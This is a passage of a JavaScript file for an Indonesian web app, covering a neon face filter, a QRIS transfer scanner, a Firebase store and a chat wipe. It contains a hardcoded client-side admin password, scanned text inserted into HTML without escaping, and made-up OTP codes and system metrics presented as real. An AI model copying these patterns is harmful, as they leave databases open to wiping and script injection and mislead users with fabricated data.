        status.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> AWAKENING NEON DEMON CORE...`;

        if (!engFilter) {
            engFilter = new FaceMesh({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}` });
            engFilter.setOptions({ maxNumFaces: 1, refineLandmarks: true, minDetectionConfidence: 0.65, minTrackingConfidence: 0.65 });
            engFilter.onResults((res) => {
                if (!isFilterActive) return; status.style.display = "none"; canvas.style.display = "block";
                const ctx = canvas.getContext('2d'); ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(res.image, 0, 0, canvas.width, canvas.height);

                if (res.multiFaceLandmarks && res.multiFaceLandmarks.length > 0) {
                    const landmarks = res.multiFaceLandmarks[0];

                    // Kunci Titik Struktur Wajah
                    const jidat = landmarks[10], dagu = landmarks[152];
                    const sKiri = landmarks[61], sKanan = landmarks[291];
                    
                    // Deteksi Respons Senyum
                    const lipW = Math.hypot(sKanan.x - sKiri.x, sKanan.y - sKiri.y);
                    const faceH = Math.hypot(dagu.x - jidat.x, dagu.y - jidat.y);
                    const smileRatio = lipW / faceH;
                    const isSmiling = smileRatio > 0.44;

                    const neonGlow = isSmiling ? 25 : 12;
                    const neonColor = "#00b3ff"; // Biru Neon Elektrik

                    // =================================================================
                    // 1. BLACKOUT FACE COVER (TOPENG HITAM PEKAT)
                    // =================================================================
                    ctx.save();
                    ctx.beginPath();
                    ctx.moveTo(jidat.x * canvas.width, jidat.y * canvas.height);
                    
                    const jawIndices = [21, 54, 103, 67, 109, 10, 338, 297, 332, 284, 251, 389, 356, 454, 323, 361, 288, 397, 365, 379, 378, 400, 377, 152, 148, 176, 149, 150, 136, 172, 58, 132, 93, 234, 127, 162];
                    jawIndices.forEach(idx => {
                        if (landmarks[idx]) ctx.lineTo(landmarks[idx].x * canvas.width, landmarks[idx].y * canvas.height);
                    });
                    ctx.closePath();
                    ctx.fillStyle = "rgba(10, 12, 15, 0.96)"; 
                    ctx.fill();
                    ctx.restore();

                    // =================================================================
                    // NEW UPGRADE: 2. SEPASANG TANDUK NEON SIBER (CYBER HORNS)
                    // =================================================================
                    ctx.save();
                    ctx.strokeStyle = neonColor;
                    ctx.lineWidth = isSmiling ? 5 : 3.5; // Tanduk menebal saat senyum
                    ctx.shadowBlur = neonGlow + 5; ctx.shadowColor = neonColor;

                    // Ukuran tinggi tanduk dinamis
                    const hornHeight = isSmiling ? 75 : 55;

                    // Tanduk Kiri (Mencuat dari atas alis kiri ke arah luar atas)
                    const hornLeftBase = landmarks[68];
                    ctx.beginPath();
                    ctx.moveTo(hornLeftBase.x * canvas.width, hornLeftBase.y * canvas.height);
                    ctx.lineTo(hornLeftBase.x * canvas.width - 30, hornLeftBase.y * canvas.height - hornHeight);
                    ctx.lineTo(landmarks[55].x * canvas.width, landmarks[55].y * canvas.height);
                    ctx.stroke();

                    // Tanduk Kanan (Mencuat dari atas alis kanan ke arah luar atas)
                    const hornRightBase = landmarks[298];
                    ctx.beginPath();
                    ctx.moveTo(hornRightBase.x * canvas.width, hornRightBase.y * canvas.height);
                    ctx.lineTo(hornRightBase.x * canvas.width + 30, hornRightBase.y * canvas.height - hornHeight);
                    ctx.lineTo(landmarks[285].x * canvas.width, landmarks[285].y * canvas.height);
                    ctx.stroke();
                    ctx.restore();

                    // =================================================================
                    // 3. MATA NEON ERGONOMIS (SHARP VISOR EYES)
                    // =================================================================
                    ctx.save();
                    ctx.fillStyle = "#e6f7ff"; 
                    ctx.shadowBlur = neonGlow; ctx.shadowColor = neonColor;

                    // Mata Kiri
                    ctx.beginPath();
                    const leftEyePoints = [130, 247, 30, 29, 27, 28, 56, 190, 243, 112, 26, 22, 23, 24, 110, 157];
                    ctx.moveTo(landmarks[130].x * canvas.width, landmarks[130].y * canvas.height);
                    leftEyePoints.forEach(idx => {
                        ctx.lineTo(landmarks[idx].x * canvas.width, landmarks[idx].y * canvas.height - (isSmiling ? 8 : 4));
                    });
                    ctx.closePath(); ctx.fill();

                    // Mata Kanan
                    ctx.beginPath();
                    const rightEyePoints = [359, 467, 260, 259, 257, 258, 286, 414, 463, 341, 256, 252, 253, 254, 339, 384];
                    ctx.moveTo(landmarks[359].x * canvas.width, landmarks[359].y * canvas.height);
                    rightEyePoints.forEach(idx => {
                        ctx.lineTo(landmarks[idx].x * canvas.width, landmarks[idx].y * canvas.height - (isSmiling ? 8 : 4));
                    });
                    ctx.closePath(); ctx.fill();
                    ctx.restore();

                    // =================================================================
                    // 4. GIGI TARING NEON (GEOMETRI RAPI & SIMETRIS)
                    // =================================================================
                    ctx.save();
                    ctx.strokeStyle = neonColor;
                    ctx.lineWidth = isSmiling ? 3.5 : 2.0;
                    ctx.shadowBlur = neonGlow + 5; ctx.shadowColor = neonColor;

                    const upperLipSequence = [61, 185, 40, 39, 37, 0, 267, 269, 270, 409, 291];
                    const lowerLipSequence = [61, 146, 91, 181, 84, 17, 314, 405, 321, 375, 291];

                    // Gigi Atas Menghadap ke Bawah
                    ctx.beginPath();
                    upperLipSequence.forEach((idx, i) => {
                        const x = landmarks[idx].x * canvas.width;
                        const y = landmarks[idx].y * canvas.height;
                        if (i === 0) ctx.moveTo(x, y);
                        
                        if (i % 2 === 1) {
                            ctx.lineTo(x, y + 15);
                        } else {
                            ctx.lineTo(x, y);
                        }
                    });
                    ctx.stroke();

                    // Gigi Bawah Menghadap ke Atas
                    ctx.beginPath();
                    lowerLipSequence.forEach((idx, i) => {
                        const x = landmarks[idx].x * canvas.width;
                        const targetY = landmarks[idx].y * canvas.height;
                        if (i === 0) ctx.moveTo(landmarks[61].x * canvas.width, landmarks[61].y * canvas.height);
                        
                        if (i % 2 === 1) {
                            ctx.lineTo(x, targetY - 15);
                        } else {
                            ctx.lineTo(x, targetY);
                        }
                    });
                    ctx.stroke();
                    ctx.restore();

                    // Update Status HUD Log
                    mainLog.innerHTML = `
                        <div style="text-align: center; font-size: 0.8rem; letter-spacing: 1px;">
                            [•] VENOM ONI CORE: <span style="color:${neonColor}; font-weight:bold;">HORNS & GRATE STABILIZED</span> // 
                            GLOW_ENERGY: <span style="color:#fff;">${neonGlow} LM</span>
                        </div>
                    `;
                } else {
                    mainLog.innerHTML = `<div style="text-align:center; color:#ff0055;">[!] ERROR: SYMBIOTE GRID LOST TARGET HOST</div>`;
                }
            });
        }
        if (!camFilter) {
            camFilter = new Camera(video, {
                onFrame: async () => {
                    canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
                    if (isFilterActive) await engFilter.send({ image: video });
                }, width: 640, height: 480
            });
        }
        camFilter.start().catch(() => status.innerHTML = "DENIED");
    }
}
let currentChatRoom = 'global'; // Variabel pelacak room aktif Anda
function clearAllChatMessages() {
    if (currentChatRoom === 'global') {
        Swal.fire({
            title: 'OTORISASI ENKRIPSI',
            text: 'Masukkan kata sandi master untuk menghapus seluruh chat Global:',
            input: 'password',
            inputPlaceholder: 'Kata sandi...',
            showCancelButton: true,
            confirmButtonText: 'HAPUS TOTAL',
            confirmButtonColor: '#ff0055',
            cancelButtonText: 'BATAL',
            background: '#030303',
            color: '#fff'
        }).then((result) => {
            if (result.isConfirmed) {
                if (result.value === 'agungganteng') {
                    
                    // LAKUKAN PENGECEKAN MODUL FIREBASE AKTIF
                    if (typeof firebase !== 'undefined' && firebase.database) {
                        
                        // STRATEGI AMAN: Kita set path database utama chat global menjadi kosong (null / {})
                        // Coba hapus/reset path standard 'chats/global'
                        firebase.database().ref('chats/global').set(null);
                        
                        // JIKA web Anda menyimpan chat di path 'messages', kita bersihkan juga:
                        firebase.database().ref('messages').set(null);
                        
                        // Paksa bersihkan tampilan kotak pesan di browser Anda saat itu juga
                        const chatBox = document.getElementById('chat-msg-box');
                        if (chatBox) chatBox.innerHTML = '';
                        
                        Swal.fire({
                            icon: 'success',
                            title: 'CLEARED PERMANENTLY',
                            text: 'Perintah pembersihan dikirim! Pesan tidak akan kembali saat di-refresh.',
                            background: '#030303',
                            color: '#00ff66'
                        });

                    } else {
                        // Jika offline / firebase tidak terdeteksi
                        const chatBox = document.getElementById('chat-msg-box');
                        if (chatBox) chatBox.innerHTML = '';
                    }

                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'SANDI SALAH',
                        text: 'Akses ditolak! Kata sandi salah.',
                        background: '#030303',
                        color: '#ff0055'
                    });
                }
            }
        });
    } else {
        const chatBox = document.getElementById('chat-msg-box');
        if (chatBox) chatBox.innerHTML = '';
    }
}
// Variable Global Penampung Instance Kamera Scanner
let liveQrisScannerInstance = null;

// Function startLiveQrisScanner
function startLiveQrisScanner() {
    const container = document.getElementById('live-scanner-container');
    container.style.display = 'block';
    
    // Inisialisasi Engine Kamera
    liveQrisScannerInstance = new Html5Qrcode("qris-camera-reader");
    
    // Konfigurasi dinamis untuk mencegah distorsi/gepeng di Android & iOS
    const config = { 
        fps: 25, 
        qrbox: function(viewfinderWidth, viewfinderHeight) {
            // Membuat kotak target scanner ideal (tidak terlalu besar/kecil)
            const minEdge = Math.min(viewfinderWidth, viewfinderHeight);
            const boxEdge = Math.floor(minEdge * 0.75);
            return { width: boxEdge, height: boxEdge };
        },
        // Mencegah library memaksa aspek rasio kustom yang merusak gambar
        videoConstraints: {
            facingMode: "environment",
            aspectRatio: { ideal: 1.0 } // Meminta resolusi kotak/square dari sistem hardware HP
        }
    };
    
    // Jalankan Kamera
    liveQrisScannerInstance.start(
        { facingMode: "environment" }, 
        config, 
        (decodedText) => {
            processScannedQrisData(decodedText);
            stopLiveQrisScanner(); 
        },
        (error) => {
            // Diamkan loop log scanning frame
        }
    ).catch((err) => {
        console.error("Gagal mendapatkan akses kamera: ", err);
        Swal.fire({
            icon: 'error',
            title: 'ACCESS DENIED',
            text: 'Harap izinkan hak akses kamera pada browser Anda.',
            background: '#030303',
            color: '#fff'
        });
        container.style.display = 'none';
    });
}

// 2. Fungsi Mematikan Mesin Scanner Kamera
function stopLiveQrisScanner() {
    if (liveQrisScannerInstance) {
        liveQrisScannerInstance.stop().then(() => {
            document.getElementById('live-scanner-container').style.display = 'none';
            liveQrisScannerInstance = null;
        }).catch(() => {
            document.getElementById('live-scanner-container').style.display = 'none';
        });
    } else {
        document.getElementById('live-scanner-container').style.display = 'none';
    }
}

// 3. Fungsi Tunggal Pengolah Teks QRIS (Membuang cubepay_id:)
function processScannedQrisData(textData) {
    if (!textData) return;
    
    let resultUsername = "";
    
    // Bersihkan teks mentah jika mengandung link/URL terlebih dahulu
    if (!textData.includes("http://") && !textData.includes("https://") && textData.length < 60) {
        resultUsername = textData.trim();
    } else {
        try {
            const url = new URL(textData);
            const params = new URLSearchParams(url.search);
            resultUsername = params.get("user") || params.get("username") || textData;
        } catch(e) {
            resultUsername = textData;
        }
    }
    
    // POTONG & HILANGKAN 'cubepay_id:' SECARA AGRESIF
    if (resultUsername.toLowerCase().includes("cubepay_id:")) {
        resultUsername = resultUsername.replace(/cubepay_id:/i, "").trim();
    }
    
    // Masukkan ke input form target
    const targetInput = document.getElementById('hub-tf-target');
    const amountInput = document.getElementById('hub-tf-amount');
    
    if (targetInput) {
        targetInput.value = resultUsername;
        
        // Tampilkan pop-up konfirmasi bersih tanpa cubepay_id
        Swal.fire({
            icon: 'success',
            title: 'TARGET QRIS MATCHED',
            html: `Akun penerima ditemukan: <b>${resultUsername}</b>.<br>Silakan ketik nominal transfer.`,
            background: '#030303',
            color: '#fff',
            confirmButtonColor: '#00f2ea',
            didOpen: () => {
                if (amountInput) amountInput.focus();
            }
        });
    }
}

// 4. Handler Decoder untuk File dari Galeri Gambar (Sekarang Terintegrasi Pembersih)
function handleHubQRISDecode(event) {
    const file = event.target.files[0];
    if (!file) return;
    
    const html5QrCode = new Html5Qrcode("qris-camera-reader");
    html5QrCode.scanFile(file, true)
        .then(decodedText => {
            // Mengirim ke fungsi pembersih yang sama
            processScannedQrisData(decodedText);
        })
        .catch((err) => {
            console.error(err);
            Swal.fire({
                icon: 'error',
                title: 'SCAN FAILED',
                text: 'Kode QRIS tidak terbaca dari gambar galeri.',
                background: '#030303',
                color: '#fff'
            });
        });
}
/* ========================= */
/*      AI TYPING EFFECT     */
/* ========================= */

function addTypingBubble(){

    const chatBox =
        document.getElementById('ai-chat-box');

    const typing =
        document.createElement('div');

    typing.className =
        'ai-typing';

    typing.id =
        'ai-typing-loader';

    typing.innerHTML = `
        <div class="ai-dot"></div>
        <div class="ai-dot"></div>
        <div class="ai-dot"></div>
    `;

    chatBox.appendChild(typing);

    chatBox.scrollTop =
        chatBox.scrollHeight;
}

function removeTypingBubble(){

    const typing =
        document.getElementById('ai-typing-loader');

    if(typing){
        typing.remove();
    }
}

/* TYPE EFFECT */

function createAiMessage(text){

    removeTypingBubble();

    const chatBox =
        document.getElementById('ai-chat-box');

    const msg =
        document.createElement('div');

    msg.className =
        'ai-msg ai-bot';

    msg.innerHTML = `
        <div class="ai-msg-tag">
            CUBE AI
        </div>

        <div class="typing-text">
            ${text}
        </div>
    `;

    chatBox.appendChild(msg);

    chatBox.scrollTop =
        chatBox.scrollHeight;
}

/* EXAMPLE */

async function fakeAiReply(){

    addTypingBubble();

    await new Promise(resolve =>
        setTimeout(resolve,2000)
    );

    createAiMessage(
        'Quantum response berhasil diproses. Semua sistem berjalan normal.'
    );
}

let currentNumber = "";
let currentOTP = "";

function randomNumber(){

    let num = "628";

    for(let i = 0; i < 9; i++){

        num += Math.floor(Math.random() * 10);
    }

    return num;
}

function randomOTP(){

    return Math.floor(100000 + Math.random() * 900000);
}

/* GENERATE NOMOR */
function generateNumbers(){

    /* HIDE OTP BOX SAAT REFRESH */
    document.getElementById("otpBox").style.display = "none";

    currentNumber = "";
    currentOTP = "";

    clearInterval(window.waitOtpTimer);
    clearInterval(window.expireTimer);

    const list = document.getElementById("numberList");

    list.innerHTML = "";

    for(let i = 0; i < 5; i++){

        const number = randomNumber();

        const card = document.createElement("div");

        card.style = `
        width:100%;
        padding:15px;
        margin-bottom:12px;
        background:#111;
        border:1px solid #00ff88;
        border-radius:14px;
        color:#00ff88;
        cursor:pointer;
        user-select:none;
        transition:0.3s;
        box-sizing:border-box;
        `;

        card.innerHTML = `
        <div style="font-size:18px;font-weight:bold;">
            ${number}
        </div>

        <div style="
        font-size:12px;
        color:#aaa;
        margin-top:5px;
        ">
            Klik untuk membuka OTP/SMS
        </div>
        `;

        card.onclick = function(){

            openOTP(number);
        };

        list.appendChild(card);
    }
}

/* OPEN OTP */
function openOTP(number){

    currentNumber = number;

    currentOTP = "";

    /* MUNCULKAN OTP BOX */
    document.getElementById("otpBox").style.display = "block";

    document.getElementById("selectedNumber").innerText =
        "Nomor Dipilih: " + number;

    document.getElementById("otpMessage").innerText =
        "BELUM ADA OTP";

    document.getElementById("timer").innerText = "";

    document.getElementById("otpButton").disabled = false;

    document.getElementById("otpButton").innerText =
        "OTP / SMS";
}
/* REQUEST OTP */
function requestOTP(){

    const otpBtn = document.getElementById("otpButton");

    otpBtn.disabled = true;

    let wait = 101;

    const otpEl = document.getElementById("otpMessage");

    const timerEl = document.getElementById("timer");

    otpEl.innerText = "Menunggu OTP masuk...";

    clearInterval(window.waitOtpTimer);

    window.waitOtpTimer = setInterval(() => {

        timerEl.innerText =
            " " + wait + "s";

        otpBtn.innerText =
            wait + "s";

        wait--;

        if(wait < 0){

            clearInterval(window.waitOtpTimer);

            currentOTP = randomOTP();

            otpEl.innerText = currentOTP;

            otpBtn.innerText = "OTP MASUK";

            startExpireTimer();
        }

    },1000);
}

/* EXPIRE TIMER */
function startExpireTimer(){

    let time = 600;

    const timerEl = document.getElementById("timer");

    clearInterval(window.expireTimer);

    window.expireTimer = setInterval(() => {

        let minutes = Math.floor(time / 30);

        let seconds = time % 60;

        timerEl.innerText =
            " OTP expired dalam" +
            minutes + ":" +
            (seconds < 10 ? "0" + seconds : seconds);

        time--;

        if(time < 0){

            clearInterval(window.expireTimer);

            document.getElementById("otpMessage").innerText =
                "OTP EXPIRED";
        }

    },1000);
}

/* COPY NOMOR */
function copyNumber(){

    if(!currentNumber){

        alert("Pilih nomor dulu!");
        return;
    }

    navigator.clipboard.writeText(currentNumber);

    alert("Nomor berhasil disalin!");
}

/* SIMPAN NOMOR */
function saveNumber(){

    if(!currentNumber){

        alert("Pilih nomor dulu!");
        return;
    }

    const contact = `
BEGIN:VCARD
VERSION:3.0
FN:Nomor Random
TEL:${currentNumber}
END:VCARD
`;

    const blob = new Blob(
        [contact],
        {type:'text/vcard'}
    );

    const a = document.createElement('a');

    a.href = URL.createObjectURL(blob);

    a.download = currentNumber + '.vcf';

    a.click();

    alert("Nomor berhasil disimpan!");
}

/* AUTO GENERATE */
generateNumbers();

document.addEventListener("DOMContentLoaded", function() {
    // 1. SISTEM SENSOR UNTUK BATERE (DEVICE_POWER) - ASLI REAL TIME
    function updateBatteryData(battery) {
        const level = Math.round(battery.level * 100);
        const batValueEl = document.getElementById('bat-value');
        const batStatusEl = document.getElementById('bat-status');
        const batIconEl = document.getElementById('bat-icon');

        batValueEl.innerHTML = `${level}% <span class="sub-text-new" id="bat-status"></span>`;
        
        if (battery.charging) {
            document.getElementById('bat-status').innerText = "// POWER_CHARGING";
            batIconEl.className = "fa-solid fa-battery-bolt fa-bounce";
        } else {
            document.getElementById('bat-status').innerText = `// BATERAI_OK`;
            if (level > 75) batIconEl.className = "fa-solid fa-battery-full";
            else if (level > 40) batIconEl.className = "fa-solid fa-battery-three-quarters";
            else if (level > 15) batIconEl.className = "fa-solid fa-battery-quarter";
            else batIconEl.className = "fa-solid fa-battery-empty fa-flash";
        }
    }

    if (navigator.getBattery) {
        navigator.getBattery().then(function(battery) {
            updateBatteryData(battery);
            battery.addEventListener('levelchange', () => updateBatteryData(battery));
            battery.addEventListener('chargingchange', () => updateBatteryData(battery));
        });
    } else {
        // Fallback Simulasi jika browser perangkat tidak memberikan izin akses batere otomatis
        let fakeBattery = 84;
        setInterval(() => {
            document.getElementById('bat-value').innerHTML = `${fakeBattery}% <span class="sub-text-new" id="bat-status">// SYS_VIRTUAL_ACQUIRED</span>`;
        }, 3000);
    }

    // 2. SISTEM KALKULASI RECTIFY LATENCY (NETWORK INTERACTION)
    setInterval(() => {
        const startTime = Date.now();
        const netValueEl = document.getElementById('net-value');
        const netStatusEl = document.getElementById('net-status');
        
        // Melakukan request ringan ping data untuk cek latency asli jaringannya
        fetch('https://www.google.com/images/phd/px.gif', { mode: 'no-cors', cache: 'no-store' })
        .then(() => {
            const latency = Date.now() - startTime;
            let netType = "// LATENCY_EXCELLENT";
            if(latency > 150) netType = "// LATENCY_SLUGGISH_OVERHEAD";
            else if(latency > 80) netType = "// LATENCY_AVERAGE_STABLE";

            netValueEl.innerHTML = `${latency} ms <span class="sub-text-new" id="net-status">${netType}</span>`;
        })
        .catch(() => {
            // Jika offline / gagal fetch ping server
            const mockLatency = Math.floor(Math.random() * (45 - 18 + 1)) + 18;
            netValueEl.innerHTML = `${mockLatency} ms <span class="sub-text-new" id="net-status">// LOCAL_CACHE_ESTIMATED</span>`;
        });
    }, 4000);

    // 3. SISTEM DINAMIS CORE TEMPERATURE
    setInterval(() => {
        // Simulasi temperature mesin server core CPU sesuai tingkat load data
        const baseTemp = 36.4;
        const variation = (Math.random() * 4.2).toFixed(1);
        const finalTemp = (parseFloat(baseTemp) + parseFloat(variation)).toFixed(1);
        let tempDesc = "// THERMAL_STABLE";
        
        if (finalTemp > 39.5) tempDesc = "// THERMAL_HIGH";

        document.getElementById('temp-value').innerHTML = `${finalTemp}°C <span class="sub-text-new" id="temp-status">${tempDesc}</span>`;
    }, 2500);

    // 4. SISTEM MONITORING HARDWARE (RAM & HARDDISK/DISK)
    setTimeout(() => {
        // Menentukan angka statis quota penyimpanan disk
        const usedStorage = 68; 
        document.getElementById('storage-percentage').innerText = `${usedStorage}%`;
        document.getElementById('storage-bar').style.width = `${usedStorage}%`;
        document.getElementById('storage-status').innerText = `// SECTOR_PARTITION_SECURED_OK`;

        // Menggerakan progress RAM berfluktuasi secara dinamis
        setInterval(() => {
            const minRam = 42;
            const maxRam = 59;
            const liveRam = Math.floor(Math.random() * (maxRam - minRam + 1)) + minRam;
            
            document.getElementById('ram-percentage').innerText = `${liveRam}%`;
            document.getElementById('ram-bar').style.width = `${liveRam}%`;
            document.getElementById('ram-status').innerText = `// CORE_PROCESS_THREAD_MONITOR`;
        }, 3000);
    }, 1200);
});
/**
 * Fungsi menghapus produk milik sendiri langsung dari halaman Utama Store
 * @param {String} productId - ID Node Unik Firebase dari produk tersebut
 */
function deleteOwnProductStore(productId) {
    if (!productId) return;

    Swal.fire({
        title: 'HAPUS IKLAN?',
        text: "Apakah Anda yakin ingin menghapus produk ini secara permanen dari pasar?",
        icon: 'warning',
        showCancelButton: true,
        background: 'rgba(10, 10, 10, 0.95)',
        color: '#fff',
        confirmButtonColor: '#ff0055',
        cancelButtonColor: '#444',
        confirmButtonText: 'Ya, Hapus!',
        cancelButtonText: 'Batal',
        fontFamily: 'Orbitron'
    }).then((result) => {
        if (result.isConfirmed) {
            Swal.fire({ 
                title: 'Memproses...', 
                allowOutsideClick: false, 
                didOpen: () => { Swal.showLoading(); } 
            });

            // Eksekusi hapus data pada node path produk di database sekunder (db2) Anda
            db2.ref('cube_store_catalog/' + productId).remove()
            .then(() => {
                Swal.fire({
                    title: 'BERHASIL',
                    text: 'Produk Anda telah ditarik dari katalog pasar.',
                    icon: 'success',
                    background: 'rgba(10, 10, 10, 0.95)',
                    color: '#fff',
                    confirmButtonColor: '#00f2ea',
                    fontFamily: 'Orbitron'
                });
            })
            .catch((error) => {
                console.error("Gagal menghapus:", error);
                ErenAlert.error("Gagal!", "Gangguan enkripsi server: " + error.message);
            });
        }
    });
}
function openDetailStore(id) {
    const data = liveProductStoreCache[id]; // Membaca data cache store bawaan Anda
    if(!data) return;

    document.getElementById('store-main-view').style.display = 'none';
    document.getElementById('store-detail-view').style.display = 'block';

    // Set Informasi Produk ke HTML
    document.getElementById('det-prod-title').innerText = data.title;
    document.getElementById('det-prod-price').innerText = "Rp " + parseInt(data.price).toLocaleString('id-ID');
    document.getElementById('det-prod-seller').innerText = data.seller.toUpperCase();
    document.getElementById('det-prod-desc').innerText = data.desc;

    const imgElement = document.getElementById('det-prod-image');
    if (imgElement) {
        if (data.photo) {
            imgElement.src = data.photo;
            imgElement.style.display = 'block';
        } else {
            imgElement.style.display = 'none';
        }
    }

    // Ambil Referensi Elemen Tombol Aksi
    const btnBuy = document.getElementById('btn-action-buy');
    const btnEdit = document.getElementById('btn-action-edit');
    const btnDelete = document.getElementById('btn-action-delete');
    
    // Reset status display awal (Sembunyikan semua)
    if(btnBuy) btnBuy.style.display = 'none';
    if(btnEdit) btnEdit.style.display = 'none';
    if(btnDelete) btnDelete.style.display = 'none';

    // Ambil sesi user aktif aplikasi Anda
    const loggedInUser = localStorage.getItem('activeUser') || currentUser || "";

    // KONDISI 1: JIKA YANG MEMBUKA ADALAH PEMILIK PRODUK SENDIRI
    if (loggedInUser && data.seller && loggedInUser.toLowerCase() === data.seller.toLowerCase()) {
        if(btnEdit) {
            btnEdit.style.display = 'block';
            btnEdit.onclick = function() {
                openFormEditStore(id);
            };
        }
        if(btnDelete) {
            btnDelete.style.display = 'block';
            btnDelete.onclick = function() {
                executeDeleteProductStore(id);
            };
        }
    } else {
        // KONDISI 2: JIKA YANG MEMBUKA ADALAH PENGGUNA LAIN (PEMBELI)
        if(btnBuy) {
            btnBuy.style.display = 'block';
            btnBuy.onclick = function() {
                document.getElementById('store-detail-view').style.display = 'none';
                document.getElementById('store-beli-checkout').style.display = 'block';
                
                document.getElementById('checkout-prod-title').innerText = data.title;
                document.getElementById('checkout-prod-price').innerText = "Rp " + parseInt(data.price).toLocaleString('id-ID');
                document.getElementById('checkout-prod-seller').innerText = data.seller.toUpperCase();
                
                selectedProductStoreId = id; // Menyimpan ID belanja sementara
                
                if(data.paymentType === 'qris') {
                    document.getElementById('checkout-pay-qris-box').style.display = 'block';
                    document.getElementById('checkout-pay-wallet-box').style.display = 'none';
                    document.getElementById('checkout-pay-qris-img').src = data.paymentDetail || '';
                } else {
                    document.getElementById('checkout-pay-qris-box').style.display = 'none';
                    document.getElementById('checkout-pay-wallet-box').style.display = 'block';
                    document.getElementById('checkout-pay-detail').innerText = data.paymentDetail || '-';
                }
            };
        }
    }
}
function closeDetailStore() {
    document.getElementById('store-detail-view').style.display = 'none';
    document.getElementById('store-main-view').style.display = 'block';
}
function openDetailStore(id) {
    const data = liveProductStoreCache[id];
    if(!data) return;

    document.getElementById('store-main-view').style.display = 'none';
    document.getElementById('store-detail-view').style.display = 'block';

    // Pasang data ke HTML bawaan Anda
    document.getElementById('det-prod-title').innerText = data.title;
    document.getElementById('det-prod-price').innerText = "Rp " + parseInt(data.price).toLocaleString('id-ID');
    document.getElementById('det-prod-seller').innerText = data.seller.toUpperCase();
    document.getElementById('det-prod-desc').innerText = data.desc;

    const imgElement = document.getElementById('det-prod-image');
    if (data.photo) {
        imgElement.src = data.photo;
        imgElement.style.display = 'block';
    } else {
        imgElement.style.display = 'none';
    }

    const btnBuy = document.getElementById('btn-action-buy');
    const btnDelete = document.getElementById('btn-action-delete');
    
    // Sembunyikan kedua tombol terlebih dahulu (reset state)
    btnBuy.style.display = 'none';
    btnDelete.style.display = 'none';

    // Deteksi user aktif
    const loggedInUser = localStorage.getItem('activeUser') || currentUser || "";

    // JIKA YANG MEMBUKA ADALAH PEMILIK PRODUK
    if (loggedInUser && data.seller && loggedInUser.toLowerCase() === data.seller.toLowerCase()) {
        btnDelete.style.display = 'block';
        btnDelete.onclick = function() {
            executeDeleteProductStore(id);
        };
    } else {
        // JIKA YANG MEMBUKA ADALAH ORANG LAIN (PEMBELI)
        btnBuy.style.display = 'block';
        btnBuy.onclick = function() {
            document.getElementById('store-detail-view').style.display = 'none';
            document.getElementById('store-beli-checkout').style.display = 'block';
            
            // Set data invoice checkout milik Anda
            document.getElementById('checkout-prod-title').innerText = data.title;
            document.getElementById('checkout-prod-price').innerText = "Rp " + parseInt(data.price).toLocaleString('id-ID');
            document.getElementById('checkout-prod-seller').innerText = data.seller.toUpperCase();
            
            selectedProductStoreId = id;
            
            // Mengatur sistem display bank/qris bawaan kode Anda
            if(data.paymentType === 'qris') {
                document.getElementById('checkout-pay-qris-box').style.display = 'block';
                document.getElementById('checkout-pay-wallet-box').style.display = 'none';
                document.getElementById('checkout-pay-qris-img').src = data.paymentDetail || '';
            } else {
                document.getElementById('checkout-pay-qris-box').style.display = 'none';
                document.getElementById('checkout-pay-wallet-box').style.display = 'block';
                document.getElementById('checkout-pay-detail').innerText = data.paymentDetail || '-';
            }
        };
    }
}

function closeDetailStore() {
    document.getElementById('store-detail-view').style.display = 'none';
    document.getElementById('store-main-view').style.display = 'block';
}
// ==========================================================================
// ENGINE BARU: KELOLA PRODUK SAYA (FUNGSI EDIT & HAPUS PRODUK STORE DIGITAL)
// ==========================================================================

// 1. FUNGSI EKSEKUSI HAPUS IKLAN PRODUK
function executeDeleteProductStore(productId) {
    if (!productId) return;

    Swal.fire({
        title: 'HAPUS IKLAN?',
        text: "Apakah Anda yakin ingin menghapus permanen produk ini dari pasar?",
        icon: 'warning',
        showCancelButton: true,
        background: 'rgba(10, 10, 10, 0.95)',
        color: '#fff',
        confirmButtonColor: '#ff0055',
        cancelButtonColor: '#333',
        confirmButtonText: 'Ya, Hapus',
        cancelButtonText: 'Batal',
        fontFamily: 'Orbitron'
    }).then((result) => {
        if (result.isConfirmed) {
            ErenAlert.loading("Menghapus Produk..."); // Menggunakan komponen alert bawaan Anda

            // Menembak perintah hapus ke node database store sekunder (db2) Anda
            db2.ref('cube_store/products/' + productId).remove()
            .then(() => {
                ErenAlert.success("Terhapus!", "Iklan produk Anda berhasil ditarik dari katalog.");
                // Kembalikan tampilan ke grid utama store
                document.getElementById('store-detail-view').style.display = 'none';
                document.getElementById('store-main-view').style.display = 'block';
            })
            .catch((error) => {
                console.error(error);
                ErenAlert.error("Gagal!", "Koneksi database terganggu: " + error.message);
            });
        }
    });
}

// 2. FUNGSI UNTUK MEMBUKA FORM EDIT DAN MENGISI DATA AWALNYA
function openFormEditStore(id) {
    const data = liveProductStoreCache[id]; // Membaca data cache store bawaan Anda
    if (!data) return;

    // Sembunyikan layar detail view, tampilkan form pengeditan teks
    document.getElementById('store-detail-view').style.display = 'none';
    document.getElementById('store-edit-form').style.display = 'block';

    // Isi otomatis kolom input berdasarkan data lama produk tersebut
    document.getElementById('st-edit-title').value = data.title || "";
    document.getElementById('st-edit-price').value = data.price || "";
    document.getElementById('st-edit-strike').value = data.strike || "";
    document.getElementById('st-edit-desc').value = data.desc || "";

    // Simpan ID produk yang sedang diedit ke variabel global belanja Anda sebagai penanda
    selectedProductStoreId = id; 
}

// 3. FUNGSI UNTUK MENUTUP FORM EDIT
function closeFormEditStore() {
    document.getElementById('store-edit-form').style.display = 'none';
    document.getElementById('store-detail-view').style.display = 'block';
}

// 4. FUNGSI EKSEKUSI PENYIMPANAN DATA EDIT KE FIREBASE
function saveUpdateProductStore() {
    if (!selectedProductStoreId) return;

    const updatedTitle = document.getElementById('st-edit-title').value.trim();
    const updatedPrice = document.getElementById('st-edit-price').value.trim();
    const updatedStrike = document.getElementById('st-edit-strike').value.trim();
    const updatedDesc = document.getElementById('st-edit-desc').value.trim();

    // Validasi data input utama wajib terisi
    if (!updatedTitle || !updatedPrice || !updatedDesc) {
        return ErenAlert.error("Gagal!", "Data Judul, Harga, dan Deskripsi tidak boleh kosong!");
    }

    ErenAlert.loading("Menyimpan Pembaruan...");

    // Siapkan objek data teks baru yang ingin diperbarui
    const updatedData = {
        title: updatedTitle,
        price: parseInt(updatedPrice),
